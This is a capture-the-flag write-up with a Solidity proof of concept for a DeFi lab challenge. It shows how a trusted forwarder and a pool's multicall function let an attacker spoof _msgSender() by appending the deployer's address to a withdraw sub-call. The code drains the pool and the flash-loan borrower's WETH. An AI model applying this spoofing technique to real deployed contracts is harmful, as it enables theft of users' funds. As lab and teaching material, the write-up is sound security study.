## It's possible to trick `_msgSender()` to return an arbitrary address using the forwarder and multicall contracts, and this can be used to drain the pool tokens

When the forwarder interacts with the pool, the function `_msgSender()` returns the right-most 20 bytes of `msg.data` as the caller address. These bytes are placed by the forwarder in the execute function before performing the call to the pool:

` bytes memory payload = abi.encodePacked(request.data, request.from);`

However, if the `multicall` function of the pool is called through the forwarder, the "trusted" last 20 bytes will be added at the end of the multicall data, but not at the end of each sub-call to be performed within the multicall.

So an attacker can add an arbitrary address at the end of the data for a `withdraw` call, and this address will be taken as the `msg.sender`. Using this mechanism, the attacker can pass the address of the contract deployer or fee receiver, allowing him to drain all the funds from the contract.

Notice: The CTF also requires recovering the 10 WETH on the flash loan borrower contract. This is possible by performing 10 calls to the flashLoan function, which will take a fixed fee of 1 WETH from the borrower. By calling it 10 times, all the borrower's funds are passed to the pool, and then we can use the above mechanism to take both the initial funds and the fees.

### PoC
```solidity
    function test_naiveReceiver() public 
    checkSolvedByPlayer 
    {
        ///// 1. preparing multicall params /////
        bytes[] memory multicall_param = new bytes[](11);
        // call 10 times flashloan to pass the borrower's funds to the pool via fee-taking
        for (uint8 i = 0; i<10; i++) {
            multicall_param[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                1, // the amount doesn't matter, cause the fee is fixed to 1 WETH
                ""
            );  
        }

        // THE ATTACK HEART IS HERE
        // call withdraw with arbitrary latest 20 bytes AKA the deployer address 
        multicall_param[10] = abi.encodeWithSignature(
            'withdraw(uint256,address)',
            weth.balanceOf(address(pool)) + 10e18, // +fees
            payable(recovery),
            deployer // attack -> This will be the latest 20 bytes of the call 
        );

        // multicall data
        bytes memory multicallData = abi.encodeWithSignature(
            "multicall(bytes[])",
            multicall_param
        );  

        ///// 2. prepare params for forwarder.execute function //////
        // 'request' param
       BasicForwarder.Request memory reqForwarder = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1e8, // any that covers the gas usage 
            nonce: forwarder.nonces(player),
            data: multicallData, // our prepared call data
            deadline: block.timestamp + 5 days // any
       });

        // 'signature' param -> google "eip-712' and "eip-192" to understand
        bytes32 request = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(reqForwarder))
        );


        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk,request);
        bytes memory signature = abi.encodePacked(r, s, v);

        ///// 3. execute call /////
        forwarder.execute(reqForwarder, signature);
    }
```
